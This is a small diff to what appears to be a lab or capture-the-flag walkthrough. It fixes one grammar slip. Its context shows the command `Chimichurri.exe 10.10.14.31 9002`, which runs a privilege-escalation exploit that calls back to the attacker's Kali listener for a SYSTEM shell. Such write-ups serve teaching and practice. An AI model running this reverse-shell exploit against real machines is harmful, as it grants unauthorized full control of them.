@@ -187,7 +187,7 @@ Finally, execeute the exploit with:
 
 `Chimichurri.exe 10.10.14.31 9002`
 
-Where the IP is your Kali machine, and `9002` the port your listening on. 
+Where the IP is your Kali machine, and `9002` is the port your listening on. 
 
 
 Execute, and this should yield you a shell as the system:
